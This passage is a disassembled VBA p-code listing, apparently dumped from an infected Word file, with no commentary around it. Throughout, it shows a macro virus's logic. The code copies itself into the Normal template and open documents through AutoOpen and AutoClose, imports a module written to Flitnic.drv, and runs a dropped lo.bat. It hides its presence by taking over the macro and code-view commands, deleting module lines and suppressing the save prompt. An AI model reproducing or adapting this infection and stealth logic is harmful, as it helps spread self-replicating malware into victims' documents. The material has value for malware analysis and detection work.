' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St i 
' Line #473:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #474:
' 	CloseAll 
' Line #475:
' 	Label look2 
' Line #476:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #477:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #478:
' 	LineCont 0x0004 01 00 00 00
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #479:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #480:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld FullCodeD 
' 	Paren 
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #481:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0014 
' 	St i 
' Line #482:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFor 
' Line #483:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #484:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #485:
' 	LineCont 0x0004 01 00 00 00
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #486:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #487:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #488:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #489:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #490:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #491:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #492:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #493:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #494:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo look2 
' Line #495:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #496:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #497:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #498:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #499:
' 	Label noactsave 
' Line #500:
' 	ElseBlock 
' Line #501:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #502:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #503:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #504:
' 	Label NoInf 
' Line #505:
' 	Label eb 
' Line #506:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #507:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #508:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #509:
' 	LineCont 0x0004 01 00 00 00
' 	GoTo NoNormal 
' Line #510:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #511:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormAtt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #512:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #513:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #514:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #515:
' 	ElseBlock 
' Line #516:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #517:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #518:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #519:
' 	Label NoNormal 
' Line #520:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #521:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Sub ViewVbCode())
' Line #522:
' 	LineCont 0x0004 01 00 00 00
' 	OnError NoDoc 
' Line #523:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #524:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #525:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #526:
' 	Label NoSet 
' Line #527:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #528:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #529:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #530:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #531:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #532:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #533:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #534:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #535:
' 	Loop 
' Line #536:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #537:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #538:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #539:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #540:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #541:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #542:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000E "SUB AUTOOPEN()"
' 	Eq 
' 	IfBlock 
' Line #543:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St Acd 
' Line #544:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFor 
' Line #545:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #546:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #547:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #548:
' 	LineCont 0x0004 0C 00 00 00
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #549:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #550:
' 	Label NoDoc 
' Line #551:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #552:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #553:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #554:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #555:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000F "SUB AUTOCLOSE()"
' 	Eq 
' 	IfBlock 
' Line #556:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St NormT 
' Line #557:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFor 
' Line #558:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #559:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #560:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #561:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #562:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #563:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St al 
' Line #564:
' 	LineCont 0x0004 0C 00 00 00
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #565:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #566:
' 	Label esub 
' Line #567:
' 	Label eb 
' Line #568:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #569:
' 	Label NoDocL 
' Line #570:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #571:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #572:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #573:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Sub ToolsMacro())
' Line #574:
' 	LineCont 0x0004 01 00 00 00
' 	OnError NoDoc 
' Line #575:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #576:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #577:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #578:
' 	Label NoSet 
' Line #579:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #580:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #581:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #582:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #583:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000E "SUB AUTOOPEN()"
' 	Eq 
' 	IfBlock 
' Line #584:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St Acd 
' Line #585:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFor 
' Line #586:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #587:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #588:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #589:
' 	LitStr 0x000C "Sub AutoOpen"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #590:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #591:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #592:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #593:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #594:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #595:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #596:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #597:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #598:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #599:
' 	LineCont 0x0004 0C 00 00 00
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #600:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #601:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #602:
' 	Label NoDoc 
' Line #603:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #604:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #605:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #606:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #607:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000F "SUB AUTOCLOSE()"
' 	Eq 
' 	IfBlock 
' Line #608:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	St NormT 
' Line #609:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFor 
' Line #610:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #611:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #612:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #613:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #614:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #615:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #616:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #617:
' 	LineCont 0x0004 01 00 00 00
' 	Ld iiii 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #618:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #619:
' 	LineCont 0x0004 01 00 00 00
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #620:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	NextVar 
' Line #621:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #622:
' 	LitStr 0x0000 ""
' 	St l 
' Line #623:
' 	LineCont 0x0004 01 00 00 00
' 	OnError (GoTo 0) 
' Line #624:
' 	LineCont 0x0004 01 00 00 00
' 	OnError eb 
' Line #625:
' 	LineCont 0x0004 01 00 00 00
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #626:
' 	LineCont 0x0004 0C 00 00 00
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #627:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #628:
' 	Label esub 
' Line #629:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #630:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #631:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #632:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #633:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #634:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #635:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #636:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #637:
' 	Loop 
' Line #638:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #639:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #640:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St a 
' Line #641:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St a 
' 	EndIf 
' Line #642:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo eb 
' 	EndIf 
' Line #643:
' 	Label eb 
' Line #644:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #645:
' 	Ld wdDialogToolsMacro 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #646:
' 	LineCont 0x0004 01 00 00 00
' 	LitVarSpecial (True)
' 	St ReInf 
' Line #647:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ReInf 
' 	EndIf 
' Line #648:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ReInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #649:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St Acd 
' Line #650:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0000 
' 	St NormT 
' Line #651:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #652:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #653:
' 	LineCont 0x0004 01 00 00 00
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAt 
' Line #654:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #655:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #656:
' 	Label look 
' Line #657:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #658:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld Inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #659:
' 	LineCont 0x0004 01 00 00 00
' 	Ld Inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #660:
' 	LineCont 0x0004 01 00 00 00
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #661:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld FullCodeN 
' 	Paren 
' 	Ld Inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #662:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0014 
' 	St i 
' Line #663:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFor 
' Line #664:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #665:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld Inn 
' 	EndForVariable 
' 	NextVar 
' Line #666:
' 	LineCont 0x0004 01 00 00 00
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #667:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #668:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #669:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
